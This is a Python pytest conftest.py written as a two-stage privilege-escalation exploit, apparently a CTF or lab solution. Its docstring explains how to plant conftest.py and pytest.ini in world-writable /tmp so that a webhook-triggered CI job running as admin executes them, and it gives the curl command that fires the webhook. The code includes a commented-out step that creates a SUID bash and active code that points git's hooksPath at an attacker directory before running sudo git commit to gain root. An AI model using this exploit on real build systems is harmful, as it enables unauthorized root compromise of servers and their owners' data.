"""
CI/CD Pipeline Injection via pytest conftest.py
================================================
Target: FastAPI webhook server running pytest as admin via sudo -u admin
Vector: /tmp is world-writable; pytest rootdir discovery walks up from
        /tmp/FastAPI_Site to /tmp, picking up any pytest.ini and conftest.py

Stage 1 - Create SUID bash (run as webmaster, triggers as admin):
    Place this file at /tmp/conftest.py
    Place pytest.ini at /tmp/pytest.ini with content:
        [pytest]
        testpaths = .

Stage 2 - Run sudo git commit (updated conftest, run from CI as admin):
    Place this file at /tmp/FastAPI_Site/test/conftest.py
    Trigger webhook: curl -X POST http://<target>:8000/webhooks \
                          -H "Content-Type: application/json" \
                          -d '{"ref":"refs/heads/main"}'
"""

import os
import subprocess


def pytest_configure(config):
    # ── Stage 1: Create SUID bash ─────────────────────────────────────────────
    # Uncomment below for Stage 1 (webmaster → admin)
    # subprocess.Popen(['bash', '-c', 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'])

    # ── Stage 2: sudo git commit → root via pre-commit hook ───────────────────
    # Run from CI process (loginuid=4294967295) so NOPASSWD applies
    os.makedirs('/home/admin/gitrepo', exist_ok=True)
    os.chdir('/home/admin/gitrepo')
    subprocess.run(['git', 'init'], capture_output=True)
    subprocess.run(['git', 'config', 'core.hooksPath', '/home/admin/myhooks'])
    subprocess.run(['git', 'config', 'user.email', 'a@a'], capture_output=True)
    subprocess.run(['git', 'config', 'user.name', 'a'], capture_output=True)
    with open('x', 'w') as f:
        f.write('x')
    subprocess.run(['git', 'add', 'x'], capture_output=True)
    subprocess.run(['sudo', '-n', '/usr/bin/git', 'commit'], capture_output=True)
